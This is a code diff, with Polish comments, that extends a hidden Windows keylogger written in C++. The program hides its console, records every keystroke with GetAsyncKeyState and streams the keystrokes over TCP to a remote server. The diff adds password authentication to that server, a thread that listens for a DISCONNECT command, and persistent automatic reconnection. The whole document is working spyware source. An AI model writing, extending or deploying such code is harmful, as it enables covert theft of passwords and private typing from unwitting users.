@@ -7,10 +7,11 @@
 #include <unordered_map>
 #include <locale>
 #include <codecvt>
+#include <thread>
+#include <atomic>
 
 #pragma comment(lib, "ws2_32.lib")
 
-// Mapa specjalnych klawiszy
 std::unordered_map<int, std::string> specialKeys = {
     {VK_BACK, "BACKSPACE"}, {VK_TAB, "TAB"},     {VK_RETURN, "ENTER"},
     {VK_SHIFT, "SHIFT"},    {VK_CONTROL, "CTRL"}, {VK_MENU, "ALT"},
@@ -24,57 +25,51 @@ std::unordered_map<int, std::string> specialKeys = {
     {VK_RCONTROL, "RCTRL"}, {VK_LMENU, "LALT"},  {VK_RMENU, "RALT"}
 };
 
-// Zamiana wchar_t na UTF-8
 std::string toUtf8(wchar_t wch) {
     std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
     return conv.to_bytes(wch);
 }
 
-// Wysyłanie klawisza do serwera
-void sendKey(SOCKET sock, const std::string& key) {
+bool sendKey(SOCKET sock, const std::string& key) {
     std::string message = key + "\n";
-    send(sock, message.c_str(), message.size(), 0);
+    int sent = send(sock, message.c_str(), message.size(), 0);
+    return sent != SOCKET_ERROR;
 }
 
-// Ukrywanie okna konsoli
 void HideConsole() {
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    HideConsole();
+std::atomic<bool> running(true);
 
-    // Inicjalizacja Winsock
-    WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
-
-    // Tworzenie socketu
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET) return 1;
-
-    // Konfiguracja adresu serwera
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(25565);
-    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // IP serwera
-
-    // Połączenie z serwerem
-    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
-        closesocket(sock);
-        WSACleanup();
-        return 1;
+void receiverThread(SOCKET sock) {
+    char buffer[64];
+    while (running) {
+        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesReceived <= 0) {
+            running = false;
+            break;
+        }
+        buffer[bytesReceived] = '\0';
+        std::string msg(buffer);
+        if (msg.find("DISCONNECT") != std::string::npos) {
+            running = false;
+            break;
+        }
     }
+}
 
-    // Główna pętla keyloggera
-    while (true) {
+void keyloggerLoop(SOCKET sock) {
+    while (running) {
         for (int key = 1; key < 256; ++key) {
             SHORT state = GetAsyncKeyState(key);
             if (state & 0x8000) {
+                std::string toSend;
+
                 if (specialKeys.count(key)) {
-                    sendKey(sock, specialKeys[key]);
-                }
-                else {
+                    toSend = specialKeys[key];
+                } else {
                     BYTE keyboardState[256];
                     GetKeyboardState(keyboardState);
 
@@ -82,18 +77,65 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
                     int result = ToUnicode(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 4, 0);
 
                     if (result > 0) {
-                        std::string utf8Char = toUtf8(buffer[0]);
-                        sendKey(sock, utf8Char);
+                        toSend = toUtf8(buffer[0]);
                     }
                 }
 
-                Sleep(100); // zapobiega wielokrotnemu wysyłaniu
+                if (!toSend.empty()) {
+                    if (!sendKey(sock, toSend)) {
+                        running = false;
+                        break;
+                    }
+                }
+
+                Sleep(100);
             }
         }
         Sleep(10);
     }
+}
 
-    closesocket(sock);
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    HideConsole();
+
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+    const char* SERVER_IP = "server_ip";
+    const int SERVER_PORT = server_port;
+    const char* PASSWORD = "server_password\n";
+
+    while (true) {
+        running = true;
+
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == INVALID_SOCKET) {
+            Sleep(5000);
+            continue;
+        }
+
+        sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(SERVER_PORT);
+        serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
+            send(sock, PASSWORD, strlen(PASSWORD), 0);
+
+            char response[64] = {0};
+            int received = recv(sock, response, sizeof(response) - 1, 0);
+
+            if (received > 0 && std::string(response).find("AUTH_OK") != std::string::npos) {
+                std::thread recvThread(receiverThread, sock);
+                keyloggerLoop(sock);
+                recvThread.join();
+            }
+        }
+
+        closesocket(sock);
+        Sleep(3000); // spróbuj ponownie po chwili
+    }
+
     WSACleanup();
     return 0;
 }
